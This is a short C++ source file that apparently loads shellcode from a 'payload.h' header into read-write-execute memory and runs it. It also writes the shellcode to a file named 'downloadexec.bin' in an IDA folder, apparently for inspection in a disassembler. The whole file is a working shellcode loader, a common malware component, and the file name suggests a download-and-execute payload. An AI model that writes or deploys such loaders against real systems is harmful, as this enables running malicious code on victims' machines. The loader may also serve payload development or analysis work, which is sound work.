#include <Windows.h>
#include <stdio.h>

#include "payload.h"

void execute_shellcode()
{
	auto size = sizeof(g_Shellcode);
	auto sc = VirtualAllocEx(GetCurrentProcess(), 0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(sc, g_Shellcode, size);

	void(*c0de)();
	c0de = static_cast<void(*)()>(sc);
	c0de();

	VirtualFreeEx(GetCurrentProcess(), sc, size, MEM_RELEASE);
}

void save_shellcode_for_checking()
{
	OFSTRUCT of{ sizeof(OFSTRUCT) };
	auto fh = (HANDLE)OpenFile("..\\IDA\\downloadexec.bin", &of, OF_WRITE | OF_CREATE);
	WriteFile(fh, g_Shellcode, sizeof(g_Shellcode), NULL, NULL);
	CloseHandle(fh);
}

int main()
{
	save_shellcode_for_checking();

	execute_shellcode();

	return 0;
}

